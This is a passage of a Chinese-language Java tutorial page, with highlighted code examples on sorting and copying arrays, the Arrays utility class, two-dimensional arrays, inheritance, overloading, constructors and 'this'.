temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="comment">//可以发现，最大的到了最后面</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//第二步： 再来一次，只不过不用比较最后一位</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length-<span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;a[i+<span class="number">1</span>])&#123;  </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[i];</span><br><span class="line">                a[i] = a[i+<span class="number">1</span>];</span><br><span class="line">                a[i+<span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="comment">//可以发现，倒数第二大的到了倒数第二个位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);       </span><br><span class="line">          </span><br><span class="line">        <span class="comment">//可以发现一个规律</span></span><br><span class="line">        <span class="comment">//后边界在收缩</span></span><br><span class="line">        <span class="comment">//所以可以在外面套一层循环</span></span><br><span class="line">          </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; a.length; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length-j-<span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]&gt;a[i+<span class="number">1</span>])&#123;  </span><br><span class="line">                    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[i];</span><br><span class="line">                    a[i] = a[i+<span class="number">1</span>];</span><br><span class="line">                    a[i+<span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="增强型for循环"><a href="#增强型for循环" class="headerlink" title="增强型for循环"></a>增强型for循环</h3><p>注：增强型for循环只能用来取值，却不能用来修改数组里的值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> values [] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">18</span>,<span class="number">62</span>,<span class="number">68</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="comment">//常规遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; values.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">each</span> <span class="operator">=</span> values[i];</span><br><span class="line">            System.out.println(each);</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//增强型for循环遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> each : values) &#123;</span><br><span class="line">            System.out.println(each);</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="复制数组"><a href="#复制数组" class="headerlink" title="复制数组"></a>复制数组</h3><p>把一个数组的值，复制到另一个数组中</p><p>System.arraycopy(src, srcPos, dest, destPos, length)<br>src: 源数组<br>srcPos: 从源数组复制数据的起始位置<br>dest: 目标数组<br>destPos: 复制到目标数组的起始位置<br>length: 复制的长度</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a [] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">18</span>,<span class="number">62</span>,<span class="number">68</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">9</span>&#125;;</span><br><span class="line">         </span><br><span class="line">        <span class="type">int</span> b[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];<span class="comment">//分配了长度是3的空间，但是没有赋值</span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">//通过数组赋值把，a数组的前3位赋值到b数组</span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">//方法一： for循环</span></span><br><span class="line">         </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b.length; i++) &#123;</span><br><span class="line">            b[i] = a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//方法二: System.arraycopy(src, srcPos, dest, destPos, length)</span></span><br><span class="line">        <span class="comment">//src: 源数组</span></span><br><span class="line">        <span class="comment">//srcPos: 从源数组复制数据的起始位置</span></span><br><span class="line">        <span class="comment">//dest: 目标数组</span></span><br><span class="line">        <span class="comment">//destPos: 复制到目标数组的启始位置</span></span><br><span class="line">        <span class="comment">//length: 复制的长度       </span></span><br><span class="line">        System.arraycopy(a, <span class="number">0</span>, b, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b.length; i++) &#123;</span><br><span class="line">            System.out.print(b[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习复制数组：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.MXBean;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Arrs</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">int</span> [] arr_0;</span><br><span class="line">        <span class="type">int</span> [] arr_1;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * <span class="number">10</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp &gt;<span class="number">5</span> &amp;&amp; temp &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                arr_0 = <span class="keyword">new</span> <span class="title class_">int</span>[temp];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * <span class="number">10</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp &gt;<span class="number">5</span> &amp;&amp; temp &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                arr_1 = <span class="keyword">new</span> <span class="title class_">int</span>[temp];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr_0.length; i++)</span><br><span class="line">            arr_0[i] = (<span class="type">int</span>) (Math.random() * <span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr_0.length; i++)</span><br><span class="line">            arr_1[i] = (<span class="type">int</span>) (Math.random() * <span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="type">int</span> [] new_arr = <span class="keyword">new</span> <span class="title class_">int</span>[arr_0.length + arr_1.length];</span><br><span class="line">        System.arraycopy(arr_0,<span class="number">0</span>,new_arr,<span class="number">0</span>,arr_0.length);</span><br><span class="line">        System.arraycopy(arr_1,<span class="number">0</span>,new_arr,arr_0.length,arr_1.length);</span><br><span class="line"> </span><br><span class="line">        System.out.println(arr_0.length);</span><br><span class="line">        System.out.println(arr_1.length);</span><br><span class="line">        System.out.println(Arrays.toString(arr_0));</span><br><span class="line">        System.out.println(Arrays.toString(arr_1));</span><br><span class="line">        System.out.println(Arrays.toString(new_arr));</span><br><span class="line">        System.out.println(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p>这是一个<strong>二维数组</strong>，里面的每一个元素，都是一个一维数组<br>所以二维数组又叫数组的数组。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> b[][] = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;</span><br><span class="line">   &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">   &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;,</span><br><span class="line">   &#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>初始化二维数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">//初始化二维数组，</span></span><br><span class="line">       <span class="type">int</span>[][] a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>]; <span class="comment">//有两个一维数组，每个一维数组的长度是3</span></span><br><span class="line">       a[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">5</span>;  <span class="comment">//可以直接访问一维数组，因为已经分配了空间</span></span><br><span class="line">          </span><br><span class="line">       <span class="comment">//只分配了二维数组</span></span><br><span class="line">       <span class="type">int</span>[][] b = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][]; <span class="comment">//有两个一维数组，每个一维数组的长度暂未分配</span></span><br><span class="line">       b[<span class="number">0</span>]  =<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>]; <span class="comment">//必须事先分配长度，才可以访问</span></span><br><span class="line">       b[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">5</span>;</span><br><span class="line">        </span><br><span class="line">       <span class="comment">//指定内容的同时，分配空间</span></span><br><span class="line">       <span class="type">int</span>[][] c = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;</span><br><span class="line">               &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>&#125;,</span><br><span class="line">               &#123;<span class="number">4</span>,<span class="number">5</span>&#125;,</span><br><span class="line">               &#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;</span><br><span class="line">       &#125;;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h3><table><thead><tr><th align="left">关键字</th><th align="left">简介</th><th align="left">示例代码</th></tr></thead><tbody><tr><td align="left">copyOfRange</td><td align="left">数组复制</td><td align="left"><a href="https://how2j.cn/k/array/array-arrays/516.html#step1059">示例代码</a></td></tr><tr><td align="left">toString()</td><td align="left">转换为字符串</td><td align="left"><a href="https://how2j.cn/k/array/array-arrays/516.html#step2225">示例代码</a></td></tr><tr><td align="left">sort</td><td align="left">排序</td><td align="left"><a href="https://how2j.cn/k/array/array-arrays/516.html#step1063">示例代码</a></td></tr><tr><td align="left">binarySearch</td><td align="left">搜索</td><td align="left"><a href="https://how2j.cn/k/array/array-arrays/516.html#step1060">示例代码</a></td></tr><tr><td align="left">equals</td><td align="left">判断是否相同</td><td align="left"><a href="https://how2j.cn/k/array/array-arrays/516.html#step1061">示例代码</a></td></tr><tr><td align="left">fill</td><td align="left">填充</td><td align="left"></td></tr></tbody></table><p>数组复制</p><p>System.arraycopy，需要事先准备好目标数组，并分配长度。 copyOfRange 只需要源数组就就可以了，通过返回值，就能够得到目标数组了。<br>除此之外，需要注意的是 copyOfRange 的<strong>第3个参数</strong>，表示源数组的结束位置，是<strong>取不到的</strong>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">9</span> &#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// copyOfRange(int[] original, int from, int to)</span></span><br><span class="line">        <span class="comment">// 第一个参数表示源数组</span></span><br><span class="line">        <span class="comment">// 第二个参数表示开始位置(取得到)</span></span><br><span class="line">        <span class="comment">// 第三个参数表示结束位置(取不到)</span></span><br><span class="line">        <span class="type">int</span>[] b = Arrays.copyOfRange(a, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b.length; i++) &#123;</span><br><span class="line">            System.out.print(b[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>转换为字符串</p><p>Arrays提供了一个toString()方法，直接把一个数组，转换为字符串，这样方便观察数组的内容</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">9</span> &#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> Arrays.toString(a);</span><br><span class="line">        System.out.println(content);</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>排序</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">9</span> &#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;排序之前 :&quot;</span>);</span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">        Arrays.sort(a);</span><br><span class="line">        System.out.println(<span class="string">&quot;排序之后:&quot;</span>);</span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搜索</p><p>需要注意的是，使用binarySearch进行查找之前，必须使用sort进行排序<br>如果数组中有多个相同的元素，查找结果是不确定的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">9</span> &#125;;</span><br><span class="line"> </span><br><span class="line">        Arrays.sort(a);</span><br><span class="line"> </span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">        <span class="comment">//使用binarySearch之前，必须先使用sort进行排序</span></span><br><span class="line">        System.out.println(<span class="string">&quot;数字 62出现的位置:&quot;</span>+Arrays.binarySearch(a, <span class="number">62</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断是否相同</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">9</span> &#125;;</span><br><span class="line">        <span class="type">int</span> b[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">8</span> &#125;;</span><br><span class="line"> </span><br><span class="line">        System.out.println(Arrays.equals(a, b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>填充</p><p>使用同一个值，填充整个数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">        Arrays.fill(a, <span class="number">5</span>);</span><br><span class="line">  </span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-类和对象"><a href="#6-类和对象" class="headerlink" title="6.类和对象"></a>6.类和对象</h2><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>引用的概念，如果一个变量的类型是 类类型，而非基本类型，那么该变量又叫做引用。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Hero</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br></pre></td></tr></table></figure><p>h这个变量是Hero类型，又叫做引用<br>&#x3D;的意思指的h这个引用<strong>代表</strong>右侧创建的对象<br>“<strong>代表</strong>” 在面向对象里，又叫做“<strong>指向</strong>”</p><p>引用有多个，但是对象只有一个。<br>在这个例子里，所有引用都指向了同一个对象。<br>对象就像 “房产”， 引用就像”房产证”<br>房产证的复印件可以有多张，但是真正的”房产” 只有这么一处</p><p>一个引用，多个对象时，只有最后一个能成功指向</p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Weapon</span> <span class="keyword">extends</span> <span class="title class_">Item</span>&#123;</span><br><span class="line">    <span class="type">int</span> damage; <span class="comment">//攻击力</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Weapon</span> <span class="variable">infinityEdge</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Weapon</span>();</span><br><span class="line">        infinityEdge.damage = <span class="number">65</span>; <span class="comment">//damage属性在类Weapon中新设计的</span></span><br><span class="line">         </span><br><span class="line">        infinityEdge.name = <span class="string">&quot;无尽之刃&quot;</span>;<span class="comment">//name属性，是从Item中继承来的，就不需要重复设计了</span></span><br><span class="line">        infinityEdge.price = <span class="number">3600</span>;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过继承别的类的属性，不需要重复设计。</p><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><p>方法名是一样的，但是参数类型不一样<br>在调用方法attack的时候，会根据传递的参数类型以及数量，自动调用对应的方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ADHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; 进行了一次攻击 ，但是不确定打中谁了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero h1)</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;对&quot;</span> + h1.name + <span class="string">&quot;进行了一次攻击 &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero h1, Hero h2)</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;同时对&quot;</span> + h1.name + <span class="string">&quot;和&quot;</span> + h2.name + <span class="string">&quot;进行了攻击 &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ADHero</span> <span class="variable">bh</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">        bh.name = <span class="string">&quot;赏金猎人&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="type">Hero</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h1.name = <span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h2.name = <span class="string">&quot;提莫&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        bh.attack(h1);</span><br><span class="line">        bh.attack(h1, h2);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>方法名和类名一样（包括大小写）<br><strong>没有返回类型</strong><br>实例化一个对象的时候，必然调用构造方法</p><p>一旦提供了一个有参的构造方法<br>同时又<strong>没有显式</strong>的提供一个无参的构造方法<br>那么默认的无参的构造方法，就“木有了“</p><h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><p><strong>this即代表当前对象</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//直接打印对象，会显示该对象在内存中的虚拟地址</span><br><span class="line">    ``//格式：Hero@c17164 c17164即虚拟地址，每次执行，得到的地址不一定一样</span><br><span class="line">    而调用行为则出现相同的地址</span><br></pre></td></tr></table></figure><p>属性名和变量名不能一样</p><p>参数名不得不使用其他变量名</p><p>用this即可解决问题</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">     </span><br><span class="line">    String name; <span class="comment">//姓名</span></span><br><span class="line">     </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">//血量</span></span><br><span class="line">     </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">//护甲</span></span><br><span class="line">     </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">//移动速度</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">//参数名和属性名一样</span></span><br><span class="line">    <span class="comment">//在方法体中，只能访问到参数name</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName1</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        name = name;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//为了避免setName1中的问题，参数名不得不使用其他变量名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName2</span><span class="params">(String heroName)</span>&#123;</span><br><span class="line">        name = heroName;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//通过this访问属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName3</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="comment">//name代表的是参数name</span></span><br><span class="line">        <span class="comment">//this.name代表的是属性name</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hero</span>  <span class="variable">h</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">         </span><br><span class="line">        h.setName1(<span class="string">&quot;teemo&quot;</span>);</span><br><span class="line">        System.out.println(h.name);</span><br><span class="line">         </span><br><span class="line">        h.setName2(<span class="string">&quot;garen&quot;</span>);</span><br><span class="line">        System.out.println(h.name);    </span><br><span class="line">         </span><br><span class="line">        h.setName3(<span class="string">&quot;死歌&quot;</span>);</span><br><span class="line">        System.out.println(h.name);    </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><p>传参分为<strong>基本类型传参</strong>和<strong>类类型传参</strong></p><p>基本：</p><p>基本类型传参<br>在方法内，无法修改方法外的基本类型参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">        </span><br><span class="line">    String name; <span class="comment">//姓名</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">//血量</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">//护甲</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">//移动速度</span></span><br><span class="line">     </span><br><span class="line">    <span 